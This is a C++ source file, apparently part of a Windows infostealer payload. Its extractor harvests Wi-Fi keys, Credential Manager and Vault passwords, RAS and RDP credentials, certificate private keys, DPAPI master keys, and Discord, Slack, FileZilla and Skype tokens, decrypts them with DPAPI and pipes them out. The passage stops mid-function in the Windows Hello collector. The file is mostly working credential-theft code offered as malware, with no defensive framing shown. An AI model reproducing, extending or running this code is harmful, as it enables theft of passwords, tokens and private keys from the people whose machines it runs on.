// File: src/payload/extra_extractor.cpp
#include "extra_extractor.hpp"
#include <wlanapi.h>
#include <dpapi.h>
#include <shlobj.h>
#include <fstream>
#include <regex>
#include <sstream>
#include <filesystem>
#include <wincred.h>
#include <wincrypt.h>
#include <winreg.h>
#include <iomanip>      // for std::setw, std::setfill
#include <map>                  
#include <sddl.h>       // for ConvertSidToStringSidW
#include <functional>   // for std::function

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "ncrypt.lib")

namespace Payload {

    // ---- forward declarations for dynamic Vault API ----
    using VaultEnumerateVaults_t = DWORD(WINAPI*)(DWORD, PDWORD, GUID*);
    using VaultOpenVault_t = DWORD(WINAPI*)(GUID*, DWORD, HANDLE*);
    using VaultEnumerateItems_t = DWORD(WINAPI*)(HANDLE, DWORD, PDWORD, PVOID*);
    using VaultCloseVault_t = DWORD(WINAPI*)(HANDLE*);
    using VaultFree_t = DWORD(WINAPI*)(PVOID);

    // ---- helper: convert binary to hex string ----
    static std::string BytesToHex(const BYTE* data, size_t len) {
        std::ostringstream hex;
        hex << std::hex << std::setfill('0');
        for (size_t i = 0; i < len; ++i) {
            hex << std::setw(2) << static_cast<int>(data[i]);
        }
        return hex.str();
    }

    static std::string BytesToHex(const std::string& str) {
        return BytesToHex(reinterpret_cast<const BYTE*>(str.data()), str.size());
    }

    // ---- helper: binary to Base64 ----
    static std::string BytesToBase64(const BYTE* data, DWORD len) {
        DWORD base64Len = 0;
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            nullptr, &base64Len)) {
            return "";
        }
        std::string out(base64Len, 0);
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            &out[0], &base64Len)) {
            return "";
        }
        // Remove trailing null
        if (!out.empty() && out.back() == '\0') out.pop_back();
        return out;
    }

    // ---- helper: DER blob to PEM ----
    static std::string DERToPEM(const BYTE* der, DWORD derLen, const char* header) {
        std::string b64 = BytesToBase64(der, derLen);
        if (b64.empty()) return "";

        std::ostringstream pem;
        pem << "-----BEGIN " << header << "-----\n";
        for (size_t i = 0; i < b64.size(); i += 64) {
            pem << b64.substr(i, 64) << "\n";
        }
        pem << "-----END " << header << "-----\n";
        return pem.str();
    }

    // ---- helper: convert CRYPT_INTEGER_BLOB to hex string ----
    static std::string BlobToHex(const CRYPT_INTEGER_BLOB& blob) {
        return BytesToHex(blob.pbData, blob.cbData);
    }

    // ---- local helpers ------------------------------------------------
    static std::string WCharToUtf8(const WCHAR* wstr) {
        if (!wstr) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
        if (size <= 0) return "";
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &result[0], size, nullptr, nullptr);
        return result;
    }

    // Attempt DPAPI decryption, first user‑level then machine‑level
    static std::string DPAPIDecrypt(const std::vector<BYTE>& blob,
        const std::vector<BYTE>& entropy = {}) {
        DATA_BLOB in = { static_cast<DWORD>(blob.size()), const_cast<BYTE*>(blob.data()) };
        DATA_BLOB ent = { 0, nullptr };
        if (!entropy.empty()) {
            ent.pbData = const_cast<BYTE*>(entropy.data());
            ent.cbData = static_cast<DWORD>(entropy.size());
        }

        DATA_BLOB out = { 0, nullptr };

        // 1. Try user context
        if (CryptUnprotectData(&in, nullptr,
            entropy.empty() ? nullptr : &ent,
            nullptr, nullptr, 0, &out)) {
            std::string result(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return result;
        }

        // 2. Try machine context (for Local System–protected blobs)
        if (CryptUnprotectData(&in, nullptr,
            entropy.empty() ? nullptr : &ent,
            nullptr, nullptr,
            CRYPTPROTECT_LOCAL_MACHINE, &out)) {
            std::string result(reinterpret_cast<char*>(out.pbData), out.cbData);
            LocalFree(out.pbData);
            return result;
        }

        return "[DPAPI_FAILED]";
    }

    static std::vector<BYTE> Base64Decode(const std::string& input) {
        DWORD len = 0;
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr))
            return {};
        std::vector<BYTE> out(len);
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &len, nullptr, nullptr))
            return {};
        return out;
    }

    // ---- Convert certificate name blob to string ----
    static std::string CertNameToString(PCERT_NAME_BLOB nameBlob) {
        char buf[256] = { 0 };
        CertNameToStrA(X509_ASN_ENCODING, nameBlob, CERT_SIMPLE_NAME_STR, buf, sizeof(buf));
        return std::string(buf);
    }

    // ---- Export private key as PEM (simplified, fallback to hex) ----
    static std::string ExportPrivateKeyAsPEM(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey, DWORD dwSpec, BOOL bCallerFree) {
        if (dwSpec == CERT_NCRYPT_KEY_SPEC) {
            // CNG key – export PKCS#8 DER and convert to PEM
            NCRYPT_HANDLE hNCrypt = (NCRYPT_HANDLE)hKey;
            DWORD blobLen = 0;
            SECURITY_STATUS status = NCryptExportKey(hNCrypt, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                nullptr, nullptr, 0, &blobLen, 0);
            if (status == ERROR_SUCCESS && blobLen > 0) {
                std::vector<BYTE> blob(blobLen);
                status = NCryptExportKey(hNCrypt, 0, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                    nullptr, blob.data(), blobLen, &blobLen, 0);
                if (status == ERROR_SUCCESS) {
                    return DERToPEM(blob.data(), blobLen, "PRIVATE KEY");
                }
            }
            return "[CNG export failed]";
        }
        else {
            // Legacy CSP key – export as PRIVATEKEYBLOB (not PEM), return hex
            HCRYPTPROV hProv = (HCRYPTPROV)hKey;
            DWORD blobLen = 0;
            if (CryptExportKey(hProv, 0, PRIVATEKEYBLOB, 0, nullptr, &blobLen)) {
                std::vector<BYTE> blob(blobLen);
                if (CryptExportKey(hProv, 0, PRIVATEKEYBLOB, 0, blob.data(), &blobLen)) {
                    return BytesToHex(blob.data(), blobLen);
                }
            }
            return "[CSP export failed]";
        }
    }

    // ---- constructor ------------------------------------------------
    ExtraExtractor::ExtraExtractor(PipeClient& pipe) : m_pipe(pipe) {}

    // ---- public entry point -----------------------------------------
    void ExtraExtractor::CollectAll() {
        CollectWiFi();
        CollectDPAPICredentials();
        CollectVault();
        CollectRAS();
        CollectPrivateKeys();
        CollectLegacyApps();
        CollectRDPHistory();
        CollectRDPFiles();
        CollectOutgoingRDP();

        CollectUserMasterKeys();
        CollectMachineMasterKeys();
        CollectWindowsHello();
        CollectAzureTokens();
    }

    // ---- WiFi (unchanged) -------------------------------------------
    void ExtraExtractor::CollectWiFi() {
        HANDLE wlan = nullptr;
        DWORD version;
        if (WlanOpenHandle(2, nullptr, &version, &wlan) != ERROR_SUCCESS) return;

        PWLAN_INTERFACE_INFO_LIST ifList = nullptr;
        if (WlanEnumInterfaces(wlan, nullptr, &ifList) == ERROR_SUCCESS) {
            for (DWORD i = 0; i < ifList->dwNumberOfItems; ++i) {
                PWLAN_PROFILE_INFO_LIST profList = nullptr;
                if (WlanGetProfileList(wlan, &ifList->InterfaceInfo[i].InterfaceGuid,
                    nullptr, &profList) == ERROR_SUCCESS) {
                    for (DWORD j = 0; j < profList->dwNumberOfItems; ++j) {
                        LPWSTR xml = nullptr;
                        DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                        if (WlanGetProfile(wlan, &ifList->InterfaceInfo[i].InterfaceGuid,
                            profList->ProfileInfo[j].strProfileName, nullptr,
                            &xml, &flags, nullptr) == ERROR_SUCCESS && xml) {
                            std::string xmlStr = WCharToUtf8(xml);
                            std::string password;
                            std::regex keyRe("<keyMaterial>([\\s\\S]*?)</keyMaterial>");
                            std::smatch match;
                            if (std::regex_search(xmlStr, match, keyRe) && match.size() > 1)
                                password = match[1].str();
                            else
                                password = "[open or no key]";
                            std::string ssid = WCharToUtf8(profList->ProfileInfo[j].strProfileName);
                            m_pipe.Log("WIFI:" + ssid + "|" + password);
                            WlanFreeMemory(xml);
                        }
                    }
                    WlanFreeMemory(profList);
                }
            }
            WlanFreeMemory(ifList);
        }
        WlanCloseHandle(wlan, nullptr);
    }

    // ---- DPAPI Credentials via CredEnumerate -------------------------
    void ExtraExtractor::CollectDPAPICredentials() {
        DWORD count = 0;
        PCREDENTIALW* creds = nullptr;
        if (!CredEnumerateW(nullptr, 0, &count, &creds)) return;

        for (DWORD i = 0; i < count; ++i) {
            std::string target = WCharToUtf8(creds[i]->TargetName);
            std::string password;

            if (creds[i]->CredentialBlobSize > 0) {
                std::vector<BYTE> blob(creds[i]->CredentialBlob,
                    creds[i]->CredentialBlob + creds[i]->CredentialBlobSize);

                // 1. Try DPAPI decryption (user‑ and machine‑scope)
                std::string dec = DPAPIDecrypt(blob);
                if (dec != "[DPAPI_FAILED]") {
                    // Trim possible trailing nulls
                    while (!dec.empty() && dec.back() == '\0') dec.pop_back();
                    password = dec;
                }
                else {
                    // 2. Fallback: interpret as wide string or hex dump
                    if (creds[i]->Type == CRED_TYPE_GENERIC) {
                        int wideLen = creds[i]->CredentialBlobSize / sizeof(wchar_t);
                        std::wstring widePwd(reinterpret_cast<wchar_t*>(creds[i]->CredentialBlob), wideLen);
                        password = WCharToUtf8(widePwd.c_str());
                    }
                    else {
                        password = BytesToHex(blob.data(), blob.size());
                    }
                }
            }
            else {
                password = "(empty)";
            }

            m_pipe.Log("DPAPI_CRED:" + target + "|" + password);
        }
        CredFree(creds);
    }

    // ---- Vault via dynamic vaultcli.dll -----------------------------
    void ExtraExtractor::CollectVault() {
        HMODULE hVaultDll = LoadLibraryW(L"vaultcli.dll");
        if (!hVaultDll) return;

        auto pVaultEnumerateVaults = (VaultEnumerateVaults_t)GetProcAddress(hVaultDll, "VaultEnumerateVaults");
        auto pVaultOpenVault = (VaultOpenVault_t)GetProcAddress(hVaultDll, "VaultOpenVault");
        auto pVaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(hVaultDll, "VaultEnumerateItems");
        auto pVaultCloseVault = (VaultCloseVault_t)GetProcAddress(hVaultDll, "VaultCloseVault");
        auto pVaultFree = (VaultFree_t)GetProcAddress(hVaultDll, "VaultFree");
        if (!pVaultEnumerateVaults || !pVaultOpenVault || !pVaultEnumerateItems ||
            !pVaultCloseVault || !pVaultFree) {
            FreeLibrary(hVaultDll);
            return;
        }

        DWORD vaultCount = 0;
        GUID vaults[32];
        if (pVaultEnumerateVaults(0, &vaultCount, vaults) != ERROR_SUCCESS) {
            FreeLibrary(hVaultDll);
            return;
        }

        bool hasWindowsVault = false;
        for (DWORD i = 0; i < vaultCount && !hasWindowsVault; ++i) {
            static const GUID WINDOWS_VAULT = { 0x4BF4C3D5, 0x4945, 0x473F,
                                              {0x8B,0x6F,0x7B,0x7F,0x6F,0x8D,0x3C,0x6E} };
            if (IsEqualGUID(vaults[i], WINDOWS_VAULT)) hasWindowsVault = true;
        }
        if (!hasWindowsVault && vaultCount < 32) {
            const GUID WINDOWS_VAULT = { 0x4BF4C3D5, 0x4945, 0x473F,
                                        {0x8B,0x6F,0x7B,0x7F,0x6F,0x8D,0x3C,0x6E} };
            vaults[vaultCount++] = WINDOWS_VAULT;
        }

        for (DWORD i = 0; i < vaultCount; ++i) {
            HANDLE hVault = NULL;
            if (pVaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) continue;

            DWORD itemCount = 0;
            PVOID itemBuffer = nullptr;
            if (pVaultEnumerateItems(hVault, 0, &itemCount, &itemBuffer) == ERROR_SUCCESS) {
                struct VAULT_ITEM_WIN8 {
                    GUID SchemaId;
                    PWSTR pszCredentialFriendlyName;
                    PVOID pResource;
                    PVOID pIdentity;
                    PVOID pAuthenticator;
                    PVOID pPackageSid;
                    FILETIME LastModified;
                    DWORD dwFlags;
                    DWORD dwPropertiesCount;
                    PVOID pProperties;
                };
                auto items = static_cast<VAULT_ITEM_WIN8*>(itemBuffer);
                for (DWORD j = 0; j < itemCount; ++j) {
                    std::string resource = WCharToUtf8(
                        items[j].pResource ? *reinterpret_cast<WCHAR**>(items[j].pResource) : L"");
                    std::string password;
                    if (items[j].pAuthenticator) {
                        WCHAR* authStr = reinterpret_cast<WCHAR*>(items[j].pAuthenticator);
                        password = WCharToUtf8(authStr);
                    }
                    m_pipe.Log("VAULT:" + resource + "|" + password);
                }
                pVaultFree(itemBuffer);
            }
            pVaultCloseVault(&hVault);
        }
        FreeLibrary(hVaultDll);
    }

    // ---- RAS ---------------------------------------------------------
    void ExtraExtractor::CollectRAS() {
        auto searchDir = [&](const std::string& pbkPath) {
            if (!std::filesystem::exists(pbkPath)) return;
            std::ifstream f(pbkPath);
            if (!f) return;
            std::string line, currentEntry;
            std::regex pwdRegex(R"(Password2=([0-9a-fA-F]+))");
            while (std::getline(f, line)) {
                if (line.empty()) continue;
                if (line[0] == '[') {
                    currentEntry = line;
                }
                else if (std::regex_search(line, pwdRegex)) {
                    std::smatch m;
                    std::regex_search(line, m, pwdRegex);
                    std::string hex = m[1].str();
                    std::vector<BYTE> blob;
                    for (size_t i = 0; i < hex.length(); i += 2)
                        blob.push_back(static_cast<BYTE>(
                            std::strtoul(hex.substr(i, 2).c_str(), nullptr, 16)));
                    std::string dec = DPAPIDecrypt(blob);
                    m_pipe.Log("RAS:" + currentEntry + "|" + dec);
                }
            }
            };

        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            searchDir(std::string(appdata) + "\\Microsoft\\Network\\Connections\\Pbk\\rasphone.pbk");
        }
        char programdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, programdata))) {
            searchDir(std::string(programdata) + "\\Microsoft\\Network\\Connections\\Pbk\\rasphone.pbk");
        }
    }

    // Convert a DER-encoded X.509 to PEM
    static std::string X509ToPEM(const BYTE* der, DWORD derLen) {
        DWORD base64Len = 0;
        if (!CryptBinaryToStringA(der, derLen, CRYPT_STRING_BASE64HEADER, nullptr, &base64Len))
            return "";
        std::string pem(base64Len, 0);
        CryptBinaryToStringA(der, derLen, CRYPT_STRING_BASE64HEADER, &pem[0], &base64Len);
        return pem;
    }

    // ---- Certificates & RSA private keys (improved DPAPI) ------------
    void ExtraExtractor::CollectPrivateKeys() {
        // Enumerate MY store – extract certificate and private key
        HCERTSTORE hMy = CertOpenSystemStoreA(0, "MY");
        if (hMy) {
            PCCERT_CONTEXT pCert = nullptr;
            while ((pCert = CertEnumCertificatesInStore(hMy, pCert)) != nullptr) {
                std::string certPem = X509ToPEM(pCert->pbCertEncoded, pCert->cbCertEncoded);
                std::string serialHex = BlobToHex(pCert->pCertInfo->SerialNumber);
                std::string subject = CertNameToString(&pCert->pCertInfo->Subject);

                HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey = 0;
                DWORD dwKeySpec = 0;
                BOOL bCallerFree = FALSE;
                if (CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_SILENT_FLAG,
                    nullptr, &hKey, &dwKeySpec, &bCallerFree)) {
                    std::string keyPem = ExportPrivateKeyAsPEM(hKey, dwKeySpec, bCallerFree);
                    if (keyPem.empty()) keyPem = "[export failed]";

                    // Send structured message
                    std::ostringstream data;
                    data << serialHex << "|" << subject << "|" << certPem << "|" << keyPem;
                    m_pipe.Log("CERT_PEM:" + data.str());

                    if (bCallerFree) {
                        if (dwKeySpec == CERT_NCRYPT_KEY_SPEC)
                            NCryptFreeObject((NCRYPT_HANDLE)hKey);
                        else
                            CryptReleaseContext((HCRYPTPROV)hKey, 0);
                    }
                }
                else {
                    // No private key – certificate only
                    std::ostringstream data;
                    data << serialHex << "|" << subject << "|" << certPem << "|";
                    m_pipe.Log("CERT_PEM:" + data.str());
                }
            }
            CertCloseStore(hMy, 0);
        }

        // Enumerate other stores (CA, ROOT) – only certificates
        static const char* stores[] = { "CA", "ROOT", "TrustedPublisher" };
        for (const char* storeName : stores) {
            HCERTSTORE hStore = CertOpenSystemStoreA(0, storeName);
            if (hStore) {
                PCCERT_CONTEXT pCert = nullptr;
                while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != nullptr) {
                    std::string certPem = X509ToPEM(pCert->pbCertEncoded, pCert->cbCertEncoded);
                    std::string serialHex = BlobToHex(pCert->pCertInfo->SerialNumber);
                    std::string subject = CertNameToString(&pCert->pCertInfo->Subject);
                    std::ostringstream data;
                    data << serialHex << "|" << subject << "|" << certPem << "|";
                    m_pipe.Log("CERT_PEM:" + data.str());
                }
                CertCloseStore(hStore, 0);
            }
        }

        // RSA key containers – try to decrypt and output
        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            std::string cryptoRSA = std::string(appdata) + "\\Microsoft\\Crypto\\RSA";
            if (std::filesystem::exists(cryptoRSA)) {
                for (auto& sidDir : std::filesystem::directory_iterator(cryptoRSA)) {
                    for (auto& keyFile : std::filesystem::recursive_directory_iterator(sidDir.path())) {
                        if (!keyFile.is_regular_file()) continue;

                        std::ifstream f(keyFile.path(), std::ios::binary);
                        std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)), {});

                        if (blob.size() < 12) continue;
                        DWORD cbEncrypted = *reinterpret_cast<DWORD*>(blob.data() + 8);
                        if (12 + cbEncrypted > blob.size()) continue;

                        std::vector<BYTE> dpapiBlob(blob.begin() + 12, blob.begin() + 12 + cbEncrypted);
                        std::string decrypted = DPAPIDecrypt(dpapiBlob);
                        std::string keyHex = (decrypted != "[DPAPI_FAILED]") ? BytesToHex(decrypted) : "[DPAPI_FAILED]";

                        // No certificate lookup for these – leave cert_pem empty
                        std::ostringstream data;
                        data << keyFile.path().string() << "|" << keyHex << "|";
                        m_pipe.Log("RSA_KEY_V2:" + data.str());
                    }
                }
            }
        }
    }

    // ---- Legacy app tokens ------------------------------------------
    void ExtraExtractor::CollectLegacyApps() {
        char appdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) return;
        std::string appdat = appdata;

        // Discord
        std::string discordDir = appdat + "\\discord\\Local Storage\\leveldb";
        if (std::filesystem::exists(discordDir)) {
            for (auto& entry : std::filesystem::directory_iterator(discordDir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path());
                std::string content((std::istreambuf_iterator<char>(f)), {});
                std::regex tokenR(R"([\"'](mfa\.[a-zA-Z0-9_-]+|ND[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)[\"'])");
                std::smatch m;
                if (std::regex_search(content, m, tokenR))
                    m_pipe.Log("DISCORD:" + m[1].str());
            }
        }

        // Slack
        std::string slackDir = appdat + "\\Slack\\Local Storage\\leveldb";
        if (std::filesystem::exists(slackDir)) {
            for (auto& entry : std::filesystem::directory_iterator(slackDir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path());
                std::string content((std::istreambuf_iterator<char>(f)), {});
                std::regex tokenR(R"((xox[a-zA-Z]-[0-9a-zA-Z-]+))");
                std::smatch m;
                if (std::regex_search(content, m, tokenR))
                    m_pipe.Log("SLACK:" + m[1].str());
            }
        }

        // FileZilla
        std::string fz = appdat + "\\FileZilla\\sitemanager.xml";
        if (std::filesystem::exists(fz)) {
            std::ifstream f(fz);
            std::string content((std::istreambuf_iterator<char>(f)), {});
            std::regex passR(R"(<Pass>([^<]+)</Pass>)");
            std::smatch m;
            if (std::regex_search(content, m, passR)) {
                std::string encoded = m[1].str();
                auto decoded = Base64Decode(encoded);
                std::string result = decoded.empty() ? encoded : std::string(decoded.begin(), decoded.end());
                m_pipe.Log("FILEZILLA:" + result);
            }
        }

        // Skype
        std::string skype = appdat + "\\Skype\\config.xml";
        if (std::filesystem::exists(skype)) {
            std::ifstream f(skype);
            std::string content((std::istreambuf_iterator<char>(f)), {});
            std::regex tokenR(R"(<Token>([^<]+)</Token>)");
            std::smatch m;
            if (std::regex_search(content, m, tokenR))
                m_pipe.Log("SKYPE:" + m[1].str());
        }
    }

    // ---- RDP Connection History --------------------------------------
    void ExtraExtractor::CollectRDPHistory() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Terminal Server Client\\Servers",
            0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
            if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Terminal Server Client\\Servers",
                0, KEY_READ | KEY_WOW64_32KEY, &hKey) != ERROR_SUCCESS) {
                return;
            }
        }

        DWORD index = 0;
        char serverName[256];
        DWORD nameLen = sizeof(serverName);

        while (RegEnumKeyExA(hKey, index++, serverName, &nameLen,
            nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            std::string server = serverName;
            std::string username;
            std::string password;

            // 1. Read the UsernameHint
            HKEY hSubKey;
            if (RegOpenKeyExA(hKey, serverName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                char uname[256] = { 0 };
                DWORD size = sizeof(uname);
                if (RegQueryValueExA(hSubKey, "UsernameHint", nullptr, nullptr,
                    reinterpret_cast<LPBYTE>(uname), &size) == ERROR_SUCCESS) {
                    username = uname;
                }
                RegCloseKey(hSubKey);
            }

            // 2. Retrieve the saved credential from Windows Credential Manager
            std::wstring target = L"TERMSRV/" + std::wstring(serverName, serverName + strlen(serverName));
            PCREDENTIALW cred = nullptr;
            if (CredReadW(target.c_str(), CRED_TYPE_DOMAIN_PASSWORD, 0, &cred) == TRUE) {
                if (cred->CredentialBlobSize > 0) {
                    std::vector<BYTE> blob(cred->CredentialBlob,
                        cred->CredentialBlob + cred->CredentialBlobSize);
                    std::string dec = DPAPIDecrypt(blob);
                    if (dec != "[DPAPI_FAILED]") {
                        while (!dec.empty() && dec.back() == '\0') dec.pop_back();
                        password = dec;
                    }
                    else {
                        // Fallback: try to interpret as wide string directly
                        int wideLen = cred->CredentialBlobSize / sizeof(wchar_t);
                        if (wideLen > 0) {
                            std::wstring widePwd(reinterpret_cast<wchar_t*>(cred->CredentialBlob), wideLen);
                            password = WCharToUtf8(widePwd.c_str());
                        }
                    }
                }
                CredFree(cred);
            }

            // 3. Send unified RDP credential message
            m_pipe.Log("RDP_CRED:" + server + "|" + username + "|" + password);

            nameLen = sizeof(serverName);
        }
        RegCloseKey(hKey);
    }

    // ---- RDP File Passwords ------------------------------------------
    void ExtraExtractor::CollectOutgoingRDP() {
        // Step 1: gather server names and usernames from registry
        std::map<std::string, std::string> serverUsername;
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Terminal Server Client\\Servers",
            0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD index = 0;
            char serverName[256];
            DWORD nameLen = sizeof(serverName);
            while (RegEnumKeyExA(hKey, index++, serverName, &nameLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, serverName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char username[256] = { 0 };
                    DWORD size = sizeof(username);
                    RegQueryValueExA(hSubKey, "UsernameHint", nullptr, nullptr,
                        reinterpret_cast<LPBYTE>(username), &size);
                    serverUsername[serverName] = username;
                    RegCloseKey(hSubKey);
                }
                nameLen = sizeof(serverName);
            }
            RegCloseKey(hKey);
        }

        // Step 2: for each server, read the saved credential (TERMSRV/<server>)
        for (const auto& [server, username] : serverUsername) {
            std::string target = "TERMSRV/" + server;
            std::wstring wTarget(target.begin(), target.end());

            PCREDENTIALW cred = nullptr;
            bool hasCred = CredReadW(wTarget.c_str(), CRED_TYPE_DOMAIN_PASSWORD, 0, &cred) == TRUE;
            std::string password;
            if (hasCred) {
                if (cred->CredentialBlobSize > 0) {
                    std::vector<BYTE> blob(cred->CredentialBlob, cred->CredentialBlob + cred->CredentialBlobSize);
                    std::string dec = DPAPIDecrypt(blob);
                    if (dec != "[DPAPI_FAILED]") {
                        while (!dec.empty() && dec.back() == '\0') dec.pop_back();
                        password = dec;
                    }
                    else {
                        // Fallback: try to interpret blob as wide string directly
                        int wideLen = cred->CredentialBlobSize / sizeof(wchar_t);
                        std::wstring widePwd(reinterpret_cast<wchar_t*>(cred->CredentialBlob), wideLen);
                        password = WCharToUtf8(widePwd.c_str());
                    }
                }
                CredFree(cred);
            }

            m_pipe.Log("RDP_CRED:" + server + "|" + username + "|" + password);
        }
    }


    void ExtraExtractor::CollectRDPFiles() {
        char userProfile[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) return;
        std::string docs = std::string(userProfile) + "\\Documents";
        if (!std::filesystem::exists(docs)) return;

        for (auto& entry : std::filesystem::recursive_directory_iterator(docs)) {
            if (!entry.is_regular_file()) continue;
            if (entry.path().extension() != ".rdp") continue;

            std::ifstream f(entry.path());
            if (!f) continue;
            std::string line;
            while (std::getline(f, line)) {
                const std::string marker = "password 51:b:";
                auto pos = line.find(marker);
                if (pos != std::string::npos) {
                    std::string b64 = line.substr(pos + marker.length());
                    auto blob = Base64Decode(b64);
                    if (!blob.empty()) {
                        std::string dec = DPAPIDecrypt(blob);
                        m_pipe.Log("RDP_FILE:" + entry.path().string() + "|" + dec);
                    }
                }
            }
        }
    }

    // Retrieve the SID of the current user token
    static std::string GetUserSid() {
        HANDLE hToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return "";
        DWORD len = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &len);
        if (len == 0) { CloseHandle(hToken); return ""; }
        std::vector<BYTE> buf(len);
        auto pUser = reinterpret_cast<TOKEN_USER*>(buf.data());
        if (!GetTokenInformation(hToken, TokenUser, pUser, len, &len)) {
            CloseHandle(hToken);
            return "";
        }
        CloseHandle(hToken);
        LPWSTR strSid = nullptr;
        if (!ConvertSidToStringSidW(pUser->User.Sid, &strSid))
            return "";
        std::string sid = WCharToUtf8(strSid);
        LocalFree(strSid);
        return sid;
    }


    // Generic helper: enumerates files in a directory, reads each, tries DPAPI decrypt.
    static void ProcessDirectoryForDPAPIBlobs(const std::filesystem::path& dir,
        const std::string& logPrefix,
        std::function<void(const std::filesystem::path&, const std::string&)> onSuccess) {
        if (!std::filesystem::exists(dir)) return;
        try {
            for (const auto& entry : std::filesystem::directory_iterator(dir)) {
                if (!entry.is_regular_file()) continue;
                std::ifstream f(entry.path(), std::ios::binary);
                if (!f) continue;
                std::vector<BYTE> blob((std::istreambuf_iterator<char>(f)),
                    std::istreambuf_iterator<char>());
                std::string decrypted = DPAPIDecrypt(blob);
                if (decrypted != "[DPAPI_FAILED]" && !decrypted.empty()) {
                    onSuccess(entry.path(), decrypted);
                }
            }
        }
        catch (...) {}
    }

    // ---- NEW COLLECTION METHODS ----

    void ExtraExtractor::CollectUserMasterKeys() {
        std::string userSid = GetUserSid();
        if (userSid.empty()) {
            m_pipe.Log("NO_USER_MASTER_KEYS");
            return;
        }

        std::filesystem::path protectDir;
        char appdata[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
            protectDir = std::filesystem::path(appdata) / "Microsoft" / "Protect" / userSid;
        }
        if (protectDir.empty() || !std::filesystem::exists(protectDir)) {
            m_pipe.Log("NO_USER_MASTER_KEYS");
            return;
        }

        bool found = false;
        ProcessDirectoryForDPAPIBlobs(protectDir, "USER_MASTER_KEY",
            [&](const std::filesystem::path& filePath, const std::string& decrypted) {
                std::string guid = filePath.filename().string();
                std::string keyHex = BytesToHex(decrypted);
                m_pipe.Log("USER_MASTER_KEY:" + userSid + "|" + guid + "|" + keyHex);
                found = true;
            });
        if (!found)
            m_pipe.Log("NO_USER_MASTER_KEYS");
    }

    void ExtraExtractor::CollectMachineMasterKeys() {
        char programdata[MAX_PATH];
        if (FAILED(SHGetFolderPathA(nullptr, CSIDL_COMMON_APPDATA, nullptr, 0, programdata))) {
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
            return;
        }
        std::filesystem::path machineDir = std::filesystem::path(programdata) / "Microsoft" / "Protect" / "S-1-5-18";
        if (!std::filesystem::exists(machineDir)) {
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
            return;
        }

        bool found = false;
        ProcessDirectoryForDPAPIBlobs(machineDir, "MACHINE_MASTER_KEY",
            [&](const std::filesystem::path& filePath, const std::string& decrypted) {
                std::string guid = filePath.filename().string();
                std::string keyHex = BytesToHex(decrypted);
                m_pipe.Log("MACHINE_MASTER_KEY:" + guid + "|" + keyHex);
                found = true;
            });
        if (!found)
            m_pipe.Log("NO_MACHINE_MASTER_KEYS");
    }
    void ExtraExtractor::CollectWindowsHello()

    {

        bool anyFound = false;

        std::string errorDetails;

        try

        {

            auto processNgcDir = [&](const std::filesystem::path& ngcDir) -> void

                {

                    if (!std::filesystem::exists(ngcDir))

                        return;

                    try

                    {

                        for (const auto& entry : std::filesystem::recursive_directory_iterator(

                            ngcDir,

                            std::filesystem::directory_options::skip_permission_denied))

                        {

                            if (!entry.is_regular_file())

                                continue;

                            std::ifstream f(entry.path(), std::ios::binary);

                            if (!f)

                                continue;

                            std::vector<BYTE> blob(

                                (std::istreambuf_iterator<char>(f)),

                                std::istreambuf_iterator<char>());

                            std::string decrypted = DPAPIDecrypt(blob);

